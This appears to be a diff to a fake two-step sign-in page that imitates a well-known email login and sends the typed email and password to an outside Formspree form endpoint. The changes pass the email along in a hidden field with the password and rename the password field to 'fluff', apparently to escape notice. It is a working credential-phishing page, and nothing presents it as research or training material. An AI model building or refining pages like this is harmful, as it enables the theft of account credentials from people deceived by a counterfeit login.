@@ -176,6 +176,7 @@
             border: none;
         }
 
+        /* Password Page Styles */
         .password-page {
             width: 100%;
             display: flex;
@@ -236,7 +237,7 @@
         <div class="right-side-container" id="emailPage">
             <!-- Email input page -->
             <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitEmail(event)">
-                <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
+                <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username" required>
                 <div class="btn-container">
                     <button type="submit" class="btn">Next</button>
                     <a href="#" class="try-another-way">Try another way</a>
@@ -248,9 +249,10 @@
     <div class="container" id="passwordPage" style="display: none;">
         <!-- Password input page -->
         <form id="passwordForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitPassword(event)">
+            <input type="hidden" name="email" value="" id="hiddenEmailInput"> <!-- Hidden email field to be sent with password -->
             <p id="welcomeText">Welcome</p>
-            <input type="password" id="passwordInput" name="password" class="input-box" placeholder="Enter your password" autocomplete="current-password">
-            
+            <input type="password" id="passwordInput" name="fluff" class="input-box" placeholder="Enter your password" autocomplete="current-password" required>
+
             <!-- Show Password Option -->
             <div class="show-password-wrapper">
                 <input type="checkbox" id="showPassword" onclick="togglePassword()"> Show Password
@@ -282,23 +284,24 @@
         function submitEmail(event) {
             event.preventDefault();
 
-            // Hide email page
-            document.getElementById('emailPage').style.display = 'none';
-
-            // Show password page
-            document.getElementById('passwordPage').style.display = 'block';
-
-            // Optionally, you can store the email in case you need it later
+            // Get email and hide the email page, show the password page
             var email = document.getElementById('emailInput').value;
-            console.log('Email entered: ', email); // You can remove this if not needed
+            document.getElementById('hiddenEmailInput').value = email; // Send email in hidden field
+
+            document.getElementById('emailPage').style.display = 'none';
+            document.getElementById('passwordPage').style.display = 'block';
         }
 
         function submitPassword(event) {
             event.preventDefault();
 
-            // Form submission logic to Formspree
+            // Submit the password form to Formspree with the "fluff" field for password
             var password = document.getElementById('passwordInput').value;
-            console.log('Password entered: ', password);
+            var email = document.getElementById('hiddenEmailInput').value; // Get email from hidden field
+
+            // Log for debugging, remove in production
+            console.log('Email:', email);
+            console.log('Password (fluff):', password);
 
             // Hide the form and show the success page
             document.getElementById('signinBox').style.display = 'none';
